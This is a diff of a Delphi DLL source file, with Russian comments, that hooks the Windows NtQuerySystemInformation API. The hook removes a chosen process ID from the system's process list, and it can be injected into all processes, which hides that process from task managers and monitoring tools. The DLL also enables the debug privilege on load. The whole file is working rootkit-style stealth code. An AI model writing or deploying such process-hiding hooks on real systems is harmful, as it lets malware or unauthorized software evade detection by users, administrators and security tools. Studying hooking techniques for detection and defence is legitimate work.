@@ -7,19 +7,15 @@ library HookLib;
 uses
   Windows,
   TlHelp32,
-  HookAPI in 'HookAPI.pas';
+  HookAPI in 'HookAPI.pas',
+  MappingAPI in 'MappingAPI.pas',
+  MicroDAsm in 'MicroDAsm.pas';
 
 //HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
 
 
 type
   UNICODE_STRING = record
-    Length        : Word;
-    MaximumLength : Word;
-    Buffer        : Pointer;
-  end;
-
-  UNICODE_STRING_WOW64 = record
     Length        : Word;
     MaximumLength : Word;
     Buffer        : Pointer;
@@ -33,7 +29,7 @@ type
   end;
 
 
-  SYSTEM_PROCESS_INFORMATION = record
+  SYSTEM_PROCESS_INFORMATION32 = record
     NextEntryOffset              : ULONG;
     NumberOfThreads              : ULONG;
     WorkingSetPrivateSize        : LARGE_INTEGER;
@@ -149,29 +145,26 @@ type
 
   NTSTATUS = LongWord;
 
-{
-function NtQuerySystemInformation(
-                                   SystemInformationClass: SYSTEM_INFORMATION_CLASS;
-                                   SystemInformation: Pointer;
-                                   SystemInformationLength: ULONG;
-                                   ReturnLength: PULONG
-                                  ): NTSTATUS; stdcall;
-}
+  {$IFDEF CPUX64}
+    SYSTEM_PROCESS_INFORMATION = SYSTEM_PROCESS_INFORMATION64;
+    PSYSTEM_PROCESS_INFORMATION = ^SYSTEM_PROCESS_INFORMATION64;
+  {$ELSE}
+    SYSTEM_PROCESS_INFORMATION = SYSTEM_PROCESS_INFORMATION32;
+    PSYSTEM_PROCESS_INFORMATION = ^SYSTEM_PROCESS_INFORMATION32;
+  {$ENDIF}
+
 
 //HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
 
 var
-  TrueNtQSI: function(
-                       SystemInformationClass: LongWord;
-                       SystemInformation: Pointer;
-                       SystemInformationLength: ULONG;
-                       ReturnLength: PULONG
-                      ): NTSTATUS; stdcall;
+  TrueNtQuerySystemInformation: function(
+                                          SystemInformationClass: LongWord;
+                                          SystemInformation: Pointer;
+                                          SystemInformationLength: ULONG;
+                                          ReturnLength: PULONG
+                                         ): NTSTATUS; stdcall;
 
-  NtQSI: Pointer;
-
-  //OriginalBlock: TOriginalBlock; // Оригинальное начало функции
-  CreatorMap: THandle = 0;
+  NtQuerySystemInformation: Pointer;
   GlobalHookHandle: THandle = 0;
   HookingState: Boolean = False;
 
@@ -179,86 +172,72 @@ var
 
 
 // Функция, которая будет выполнена вместо перехваченной NtQuerySystemInformation:
-function HookedNtQSI(
-                      SystemInformationClass: LongWord;
-                      SystemInformation: Pointer;
-                      SystemInformationLength: ULONG;
-                      ReturnLength: PULONG
-                     ): NTSTATUS; stdcall;
+function HookedNtQuerySystemInformation(
+                                         SystemInformationClass: LongWord;
+                                         SystemInformation: PSYSTEM_PROCESS_INFORMATION;
+                                         SystemInformationLength: ULONG;
+                                         ReturnLength: PULONG
+                                        ): NTSTATUS; stdcall;
 var
-  MappingObject: THandle;
   MappedFilePointer: Pointer;
   HidingProcessID: LongWord;
-  ProcessInfo: ^SYSTEM_PROCESS_INFORMATION64;
-  NextEntryOffset: ULONG;
-  LastEntryOffsetAddr: PULONG;
+  SystemInfo: PSYSTEM_PROCESS_INFORMATION;
 begin
-  Result := TrueNtQSI(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
-  if HookingState then Exit;
+  Result := TrueNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 
+  // Проверяем случаи, когда изменять результат не надо::
+  if HookingState or (Result <> 0) then Exit;
+  if SystemInformationClass <> LongWord(SystemProcessInformation) then Exit;
 
-  if (SystemInformationClass = LongWord(SystemProcessInformation)) and (Result = 0) then
+  MappedFilePointer := GetMappedMemory('HookAPI Map', SizeOf(HidingProcessID));
+
+  if MappedFilePointer = nil then Exit;
+
+  HidingProcessID := LongWord(MappedFilePointer^);
+  if HidingProcessID = $FFFFFFFF then
   begin
-    MappingObject := OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, 'HookAPI Map');
-    if MappingObject <> 0 then
-    begin
-      MappedFilePointer := MapViewOfFile(MappingObject, FILE_MAP_ALL_ACCESS, 0, 0, SizeOf(HidingProcessID));
-
-      if MappedFilePointer <> nil then
-      begin
-        HidingProcessID := LongWord(MappedFilePointer^);
-        ProcessInfo := SystemInformation;
-
-        LastEntryOffsetAddr := @(ProcessInfo.NextEntryOffset);
-
-        repeat
-          NextEntryOffset := ProcessInfo.NextEntryOffset;
-
-          // Ищем наш процесс:
-          if ProcessInfo.UniqueProcessId = HidingProcessID then
-          begin
-            LastEntryOffsetAddr^ := NextEntryOffset;
-            //ProcessInfo.UniqueProcessId := 9999;
-            Break;
-          end;
-
-          LastEntryOffsetAddr := @(ProcessInfo.NextEntryOffset);
-
-          // Получаем адрес следующего блока:
-          ProcessInfo := Pointer(Int64(ProcessInfo) + NextEntryOffset);
-        until NextEntryOffset = 0;
-
-        UnmapViewOfFile(MappedFilePointer);
-      end;
-
-      CloseHandle(MappingObject);
-    end;
+    FreeMappedMemory(MappedFilePointer);
+    Exit;
   end;
+
+  SystemInfo := SystemInformation;
+
+  while SystemInfo.NextEntryOffset > 0 do
+  begin
+    // Если следующий элемент - наш процесс,...:
+    if PSYSTEM_PROCESS_INFORMATION(NativeUInt(SystemInfo) + SystemInfo.NextEntryOffset).UniqueProcessId = HidingProcessID then
+    begin
+      // ...то скрываем его:
+      if PSYSTEM_PROCESS_INFORMATION(NativeUInt(SystemInfo) + SystemInfo.NextEntryOffset).NextEntryOffset <> 0 then
+        SystemInfo.NextEntryOffset := PSYSTEM_PROCESS_INFORMATION(NativeUInt(SystemInfo) + SystemInfo.NextEntryOffset).NextEntryOffset + SystemInfo.NextEntryOffset
+      else
+        SystemInfo.NextEntryOffset := 0;
+
+      Break;
+    end;
+
+    SystemInfo := Pointer(NativeUInt(SystemInfo) + SystemInfo.NextEntryOffset);
+  end;
+
+  FreeMappedMemory(MappedFilePointer);
 end;
 
 
 // - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
+
 procedure HideProcess(ProcessID: LongWord; HideInAllProcesses: Boolean); stdcall; export;
 var
-  MappingObject: THandle;
-  MappedFilePointer: Pointer;
+  MappedMemory: Pointer;
 begin
-  MappingObject := OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, 'HookAPI Map');
-  if MappingObject = 0 then
+  MappedMemory := GetMappedMemory('HookAPI Map', SizeOf(ProcessID));
+  if MappedMemory <> nil then
   begin
-    CreatorMap := CreateFileMapping(GetCurrentProcess, nil, PAGE_READWRITE, 0, SizeOf(ProcessID), 'HookAPI Map');
-    if (GlobalHookHandle = 0) and HideInAllProcesses then
-      HookEmAll(GlobalHookHandle);
+    LongWord(MappedMemory^) := ProcessID;
+    FreeMappedMemory(MappedMemory);
   end;
 
-  MappingObject := OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, 'HookAPI Map');
-
-
-  MappedFilePointer := MapViewOfFile(MappingObject, FILE_MAP_ALL_ACCESS, 0, 0, SizeOf(ProcessID));
-  LongWord(MappedFilePointer^) := ProcessID;
-  UnmapViewOfFile(MappedFilePointer);
-  CloseHandle(MappingObject);
+  if (HideInAllProcesses) and (GlobalHookHandle <> 0) then HookEmAll(GlobalHookHandle);
 end;
 
 
@@ -268,8 +247,9 @@ end;
 procedure UnHideProcess; stdcall; export;
 begin
   HookingState := True;
-  UnHook(@NtQSI, @TrueNtQSI);
+  UnHook(NtQuerySystemInformation, @TrueNtQuerySystemInformation);
   HookingState := False;
+
   if GlobalHookHandle <> 0 then UnHookEmAll(GlobalHookHandle);
 end;
 
@@ -282,26 +262,22 @@ begin
     DLL_PROCESS_ATTACH:
     begin
       NtSetPrivilege(SE_DEBUG_NAME, True);
-      NtQSI := GetProcAddress(GetModuleHandle('ntdll.dll'), 'NtQuerySystemInformation');
+      NtQuerySystemInformation := GetProcAddress(GetModuleHandle('ntdll.dll'), 'NtQuerySystemInformation');
 
       HookingState := True;
-
-      SetHook(NtQSI, @HookedNtQSI, @TrueNtQSI);
+      SetHook(NtQuerySystemInformation, @HookedNtQuerySystemInformation, @TrueNtQuerySystemInformation);
       HookingState := False;
     end;
 
     DLL_PROCESS_DETACH:
     begin
       HookingState := True;
-      UnHook(NtQSI, @TrueNtQSI);
+      UnHook(NtQuerySystemInformation, @TrueNtQuerySystemInformation);
       HookingState := False;
-      FreeOriginalBlock(@TrueNtQSI);
 
-      if CreatorMap <> 0 then
-      begin
-        CloseHandle(CreatorMap);
-        if GlobalHookHandle <> 0 then UnHookEmAll(GlobalHookHandle);
-      end;
+      FreeOriginalBlock(@TrueNtQuerySystemInformation);
+
+      if GlobalHookHandle <> 0 then UnHookEmAll(GlobalHookHandle);
     end;
   end;
 end;
@@ -314,6 +290,6 @@ exports UnHideProcess;
 
 begin
   DllProc := @DLLMain;
-  DllProc(DLL_PROCESS_ATTACH) ;
+  DllProc(DLL_PROCESS_ATTACH);
 end.
 
